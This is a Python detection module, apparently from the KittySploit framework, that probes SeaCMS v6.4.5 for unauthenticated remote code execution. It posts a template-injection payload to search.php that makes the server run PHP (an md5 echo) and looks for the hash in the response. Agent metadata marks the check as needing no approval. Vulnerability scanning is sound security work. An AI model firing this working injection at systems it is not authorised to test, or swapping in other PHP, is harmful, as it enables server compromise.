#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in SeaCMS allows remote unauthenticated attackers to execute arbitrary PHP code."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SeaCMS V6.4.5 RCE Detection',
        'description': 'A vulnerability in SeaCMS allows remote unauthenticated attackers to execute arbitrary PHP code.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'seacms', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://mengsec.com/2018/08/06/SeaCMS-v6-45前台代码执行漏洞分析/'],
    }

    def run(self):
        path = '/search.php?searchtype=5'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data="searchtype=5&order=}{end if} {if:1)echo md5('seacms');if(1}{end if}")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('b1e597fa44dfd7669966bfab04eeb8ea',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='high',
                reason='SeaCMS V6.4.5 RCE detected',
                path=path,
            )
            return True
        return False

